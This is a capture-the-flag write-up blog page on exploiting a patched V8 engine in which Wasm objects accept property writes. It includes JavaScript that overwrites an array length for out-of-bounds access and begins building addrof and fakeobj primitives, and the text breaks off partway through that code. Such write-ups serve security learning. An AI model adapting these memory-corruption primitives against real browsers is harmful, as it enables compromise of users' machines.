<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='CTFZone Quals 2024 - Wasminator Introduction I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended.
Background JavaScript Object Representation Source: https://jhalon.github.io/chrome-browser-exploitation-1/
Pointer Tagging and Compression V8 uses pointer tagging to differentiate between small immediates (Smis) and pointers. The least significant bit indicates whether a value is a pointer (1) or a Smi (0).'>
<title>Wasminator</title>

<link rel='canonical' href='http://localhost:1313/posts/wasminator/'>

<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='Wasminator'>
<meta property='og:description' content='CTFZone Quals 2024 - Wasminator Introduction I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended.
Background JavaScript Object Representation Source: https://jhalon.github.io/chrome-browser-exploitation-1/
Pointer Tagging and Compression V8 uses pointer tagging to differentiate between small immediates (Smis) and pointers. The least significant bit indicates whether a value is a pointer (1) or a Smi (0).'>
<meta property='og:url' content='http://localhost:1313/posts/wasminator/'>
<meta property='og:site_name' content='spektre'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTFZone Quals 2024' /><meta property='article:tag' content='V8' /><meta property='article:tag' content='Browser Exploitation' /><meta property='article:published_time' content='2024-08-22T16:55:07&#43;05:30'/><meta property='article:modified_time' content='2024-08-22T16:55:07&#43;05:30'/>
<meta name="twitter:title" content="Wasminator">
<meta name="twitter:description" content="CTFZone Quals 2024 - Wasminator Introduction I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended.
Background JavaScript Object Representation Source: https://jhalon.github.io/chrome-browser-exploitation-1/
Pointer Tagging and Compression V8 uses pointer tagging to differentiate between small immediates (Smis) and pointers. The least significant bit indicates whether a value is a pointer (1) or a Smi (0).">
    <link rel="shortcut icon" href="/favicon.png" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "auto");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu4832408906922234309.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">spektre</a></h1>
            <h2 class="site-description">CTF Player | Browser Exploitation</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/SanjayVardhan'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com/0xspektre'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
                <li id="i18n-switch">  
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
                        
                            <option value="http://localhost:1313/" selected></option>
                        
                    </select>
                </li>
            
            
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#background">Background</a>
      <ol>
        <li><a href="#javascript-object-representation">JavaScript Object Representation</a></li>
        <li><a href="#pointer-tagging-and-compression">Pointer Tagging and Compression</a></li>
      </ol>
    </li>
    <li><a href="#patch-analysis">Patch Analysis</a></li>
    <li><a href="#exploitation">Exploitation</a>
      <ol>
        <li><a href="#helper-functions">Helper Functions</a></li>
        <li><a href="#building-webassembly-module">Building WebAssembly Module</a></li>
        <li><a href="#constructing-primitives">Constructing Primitives</a></li>
      </ol>
    </li>
    <li><a href="#full-exploit">Full Exploit</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf-writeup/" >
                CTF Writeup
            </a>
        
            <a href="/categories/browser-exploitation/" >
                Browser Exploitation
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/posts/wasminator/">Wasminator</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Aug 22, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    8 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="ctfzone-quals-2024---wasminator">CTFZone Quals 2024 - Wasminator</h1>
<h2 id="introduction">Introduction</h2>
<p>I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended.</p>
<h2 id="background">Background</h2>
<h3 id="javascript-object-representation">JavaScript Object Representation</h3>
<p><img src="https://hackmd.io/_uploads/rkwLUDmoR.png"
	
	
	
	loading="lazy"
	
		alt="image"
	
	
>
Source: <a class="link" href="https://jhalon.github.io/chrome-browser-exploitation-1/"  target="_blank" rel="noopener"
    >https://jhalon.github.io/chrome-browser-exploitation-1/</a></p>
<h3 id="pointer-tagging-and-compression">Pointer Tagging and Compression</h3>
<p>V8 uses pointer tagging to differentiate between small immediates (Smis) and pointers. The least significant bit indicates whether a value is a pointer (1) or a Smi (0). This is why you will see me subtracting 1 from the pointers when debugging in gdb.</p>
<p>V8 introduced pointer compression to reduce pointer sizes to 32 bits on 64-bit architectures. A 32-bit isolate root is established, corresponding to the start of a 4GB memory block called the V8 sandbox. This isolate root is then combined with the 32-bit compressed pointer to address 64-bit memory efficiently. The higher 4 bytes are stored in r13, and In memory the lower 4 bytes are stored.</p>
<p>If we have a pointer <code>0x11223344</code>, in memory it will be stored as <code>0x11223345</code> and Smi&rsquo;s are left shifted by 1 to differentiate b/w a smi and a pointer.</p>
<p>Example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0x24c6081f46f1 &lt;JSArray<span class="o">[</span>1<span class="o">]</span>&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; x/2gx 0x24c6081f46f1-1
</span></span><span class="line"><span class="cl">0x24c6081f46f0: 0x08000725081cce15      0x0000000208394db5
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="patch-analysis">Patch Analysis</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">diff --git a/src/objects/objects.cc b/src/objects/objects.cc
</span></span><span class="line"><span class="cl">index 71c4b37adcc..0f670bdd7d1 100644
</span></span><span class="line"><span class="cl">--- a/src/objects/objects.cc
</span></span><span class="line"><span class="cl">+++ b/src/objects/objects.cc
</span></span><span class="line"><span class="cl">@@ -2228,8 +2228,9 @@ Maybe&lt;bool&gt; Object::SetPropertyInternal(LookupIterator* it,
</span></span><span class="line"><span class="cl">       }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">       case LookupIterator::WASM_OBJECT:
</span></span><span class="line"><span class="cl">-        RETURN_FAILURE(it-&gt;isolate(), kThrowOnError,
</span></span><span class="line"><span class="cl">-                       NewTypeError(MessageTemplate::kWasmObjectsAreOpaque));
</span></span><span class="line"><span class="cl">+        //RETURN_FAILURE(it-&gt;isolate(), kThrowOnError,
</span></span><span class="line"><span class="cl">+        //               NewTypeError(MessageTemplate::kWasmObjectsAreOpaque));
</span></span><span class="line"><span class="cl">+        return SetDataProperty(it, value);
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">       case LookupIterator::INTERCEPTOR: {
</span></span><span class="line"><span class="cl">         if (it-&gt;HolderIsReceiverOrHiddenPrototype()) {
</span></span></code></pre></td></tr></table>
</div>
</div><p>With this patch, instead of returning a failure and throwing a <code>TypeError</code> indicating that WASM objects are opaque, the code now calls <code>SetDataProperty(it, value)</code>, allowing us to modify the properties of the <code>WASM_OBJECT</code>.</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="helper-functions">Helper Functions</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">fi_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">f_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">fi_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">i_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">fi_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">i_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">i_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">lower</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">i</span><span class="o">&amp;</span><span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">upper</span><span class="p">(</span><span class="nx">i</span><span class="p">){</span> 
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nx">i</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="nx">n</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">start</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">content</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">start</span> <span class="o">+</span> <span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="building-webassembly-module">Building WebAssembly Module</h3>
<p>We can build a WebAssembly module using the wasm-module-builder.js in our exploit script.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">d8</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="sb">`test/mjsunit/wasm/wasm-module-builder.js`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WasmModuleBuilder</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">array</span> <span class="o">=</span> <span class="nx">builder</span><span class="p">.</span><span class="nx">addArray</span><span class="p">(</span><span class="nx">kWasmI32</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">builder</span><span class="p">.</span><span class="nx">addFunction</span><span class="p">(</span><span class="s1">&#39;createArray&#39;</span><span class="p">,</span> <span class="nx">makeSig</span><span class="p">([</span><span class="nx">kWasmI32</span><span class="p">],</span> <span class="p">[</span><span class="nx">kWasmExternRef</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">addBody</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">kExprLocalGet</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">kGCPrefix</span><span class="p">,</span> <span class="nx">kExprArrayNewDefault</span><span class="p">,</span> <span class="nx">array</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">kGCPrefix</span><span class="p">,</span> <span class="nx">kExprExternConvertAny</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">exportFunc</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>makeSig([kWasmI32], [kWasmExternRef])</code> defines the function signature, It takes a i32 parameter and returns an external reference.
This function essentially takes an argument and creates an array with that argument as its size. Then using <code>kExprExternConvertAny</code> it creates an external reference so that it can be used in JavaScript.</p>
<h3 id="constructing-primitives">Constructing Primitives</h3>
<p>When adding properties to an object, V8 usually places them in the property array. In case of Wasm Objects, It doesnt have a property array. Lets create an array and see how the object layout is in wasm object&rsquo;s case.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">w_array</span> <span class="o">=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nx">createArray</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://hackmd.io/_uploads/ByCAXJNjC.png"
	
	
	
	loading="lazy"
	
		alt="image"
	
	
>
We can see that the size is placed right after the map, where, in a typical JSObject, the properties array would be located. However, since this is a Wasm Object, it lacks a properties array, and due to the patch, we can manipulate these values.</p>
<p>So we can store any address in the size and directly change the values in that address. Now lets try to do that.</p>
<p>Object layout of <code>arr</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0x24c6081f46f1 &lt;JSArray<span class="o">[</span>1<span class="o">]</span>&gt;
</span></span><span class="line"><span class="cl">V8 version 12.7.224.12
</span></span><span class="line"><span class="cl">d8&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/8gx 0x24c6081f46f1-1
</span></span><span class="line"><span class="cl">0x24c6081f46f0: 0x08000725081cce15      0x0000000208394db5
</span></span><span class="line"><span class="cl">0x24c6081f4700: 0x0000000808000635      0x0000000000000004
</span></span></code></pre></td></tr></table>
</div>
</div><p>The size is stored as <code>size&lt;&lt;1</code> which is the upper part of <code>0x0000000208394db5</code>. We now create an array using the wasm module with the address as its size and overwrite that address with a large value.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">w_array</span> <span class="o">=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nx">createArray</span><span class="p">(</span><span class="mh">0x81f46f9</span><span class="p">);</span> <span class="c1">// address of arr + 8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">w_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffff</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now if we check the size, we can see that it is overwritten.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">w_array</span> <span class="o">=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nx">createArray</span><span class="p">(</span><span class="mh">0x81f4791</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">w_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0x0b01081f4789 &lt;JSArray<span class="o">[</span>1<span class="o">]</span>&gt;
</span></span><span class="line"><span class="cl"><span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="m">65535</span>
</span></span><span class="line"><span class="cl">V8 version 12.7.224.12
</span></span><span class="line"><span class="cl">d8&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have overwritten the array size we now have out of bounds access. Using this we construct addrof and fakeobj primitives.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">arr1</span> <span class="o">=</span> <span class="p">[{}];</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">arr2</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">brr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nx">obj</span><span class="p">;</span>
